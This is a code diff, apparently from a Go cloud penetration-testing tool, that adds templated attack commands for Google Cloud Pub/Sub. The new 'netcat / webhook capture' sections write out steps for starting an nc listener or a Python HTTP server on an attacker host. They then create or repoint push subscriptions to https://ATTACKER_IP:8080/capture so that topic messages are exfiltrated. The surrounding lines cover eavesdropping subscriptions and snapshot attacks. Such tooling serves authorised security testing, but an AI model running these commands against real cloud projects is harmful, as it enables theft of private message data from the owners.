@@ -292,6 +292,25 @@ gcloud pubsub topics publish %s --message='test' --attribute='key1=value1,key2=v
 # Create a new subscription to eavesdrop on messages (requires pubsub.subscriptions.create)
 # gcloud pubsub subscriptions create attacker-sub-%s --topic=%s --project=%s
 
+# === NETCAT / WEBHOOK CAPTURE ===
+
+# Step 1: Start a listener on your attacker host (e.g., a VM with a public IP)
+#   nc -lk 4444
+# Or use a simple HTTP server to see full requests:
+#   python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler; import json
+#   class H(BaseHTTPRequestHandler):
+#       def do_POST(self):
+#           data = self.rfile.read(int(self.headers['Content-Length']))
+#           print(json.dumps({'headers': dict(self.headers), 'body': data.decode()}, indent=2))
+#           self.send_response(200); self.end_headers()
+#   HTTPServer(('0.0.0.0', 8080), H).serve_forever()"
+
+# Step 2: Create a push subscription pointed at your listener (requires pubsub.subscriptions.create)
+# gcloud pubsub subscriptions create exfil-sub-%s --topic=%s --project=%s --push-endpoint="https://ATTACKER_IP:8080/capture"
+
+# All new messages published to this topic will be POSTed to your listener as JSON
+# The message body is base64-encoded in the POST payload under .message.data
+
 `,
 		topic.Name, topic.ProjectID,
 		topic.Name, topic.ProjectID,
@@ -301,6 +320,7 @@ gcloud pubsub topics publish %s --message='test' --attribute='key1=value1,key2=v
 		topic.Name, topic.ProjectID,
 		topic.Name, topic.ProjectID,
 		topic.Name, topic.ProjectID,
+		topic.Name, topic.Name, topic.ProjectID,
 		topic.Name, topic.Name, topic.ProjectID,
 	)
 }
@@ -417,6 +437,23 @@ gcloud pubsub subscriptions pull %s --project=%s --limit=100 --auto-ack
 # Pull and save to file
 # gcloud pubsub subscriptions pull %s --project=%s --limit=1000 --format=json > messages.json
 
+# === NETCAT / WEBHOOK CAPTURE ===
+
+# Convert this subscription to push mode and redirect messages to your listener (requires pubsub.subscriptions.update)
+# Step 1: Start a listener on your attacker host
+#   nc -lk 4444
+# Or use a Python HTTP server:
+#   python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler; import json
+#   class H(BaseHTTPRequestHandler):
+#       def do_POST(self):
+#           data = self.rfile.read(int(self.headers['Content-Length']))
+#           print(json.dumps({'headers': dict(self.headers), 'body': data.decode()}, indent=2))
+#           self.send_response(200); self.end_headers()
+#   HTTPServer(('0.0.0.0', 8080), H).serve_forever()"
+# Step 2: Set push endpoint on this subscription
+# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="https://ATTACKER_IP:8080/capture"
+# Messages will be POSTed as JSON with base64-encoded data in .message.data
+
 # === SNAPSHOT & SEEK ATTACKS ===
 
 # Create a snapshot of current subscription state (requires pubsub.snapshots.create)
@@ -449,8 +486,10 @@ gcloud pubsub subscriptions pull %s --project=%s --limit=100 --auto-ack
 # Current push endpoint: %s
 # Push SA: %s
 
-# Modify push endpoint to redirect messages to attacker-controlled server (requires pubsub.subscriptions.update)
-# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="https://attacker.com/webhook"
+# Redirect messages to attacker listener (requires pubsub.subscriptions.update)
+# Step 1: Start listener: nc -lk 4444  (or python3 HTTP server on port 8080)
+# Step 2: Modify push endpoint:
+# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="https://ATTACKER_IP:8080/capture"
 
 # Remove push config (convert to pull subscription for easier exfiltration)
 # gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint=""
